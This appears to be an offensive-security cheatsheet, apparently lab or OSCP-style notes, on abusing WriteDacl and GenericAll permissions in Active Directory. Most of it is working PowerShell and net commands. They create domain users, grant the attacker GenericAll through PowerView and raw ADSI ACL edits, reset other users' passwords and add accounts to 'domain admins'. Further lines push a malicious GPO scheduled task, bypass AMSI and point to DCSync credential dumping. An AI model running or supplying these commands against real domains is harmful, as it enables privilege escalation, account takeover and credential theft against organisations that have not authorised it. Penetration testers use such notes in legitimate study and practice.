# WriteDacl

Account Operators/Write DACL - [[AMSI-Exploitation]]
[[PowerView-Cheatsheet]], [[evil-winrm-Cheatsheet]] and [[Impacket-Cheatsheet]] or  [[Crackmapexec-Cheatsheet]]
```powershell
# Account Operators can create and modify non-protected users and groups
# Find one - Non-Protect != Protected, but more privileged the better
net user $user $password /add /domain
net group "$Non-Protected-Group" $user /add
net localgroup "Remote Managment Users" $user /add # For Remoting
Bypass-4MSI # Evil-Winrm
# Dump creds with DC-SYNCing and secretsdumps
```
[[AD-DCSync-Attack]] 



To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll privilege.

You may need to authenticate to the Domain Controller as ANIRUDH@VAULT.OFFSEC if you are not running a process as that user. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

```powershell
$SecPassword = ConvertTo-SecureString 'passwords' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('$domain\user', $SecPassword)
```

Then, use Add-DomainObjectAcl, optionally specifying `$Cred` if you are not already running a process as `$user`:

```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All
```

With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse. 

Cleanup can be done using the Remove-DomainObjectAcl function:

```powershell
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All
```

[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) - similarly requires Powerview

If owner of a group:
```powershell
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

Give self GenericAll
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Add new users to the group
```powershell
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```

Reset a password with GenericAll on a User
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
# Reset delegate account password
net user delegate delegate /domain
```

Or Join a group
```powershell
net group "domain admins" spotless /add /domain
```

## References

[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) 
[Bloodhound.py](https://github.com/fox-it/BloodHound.py)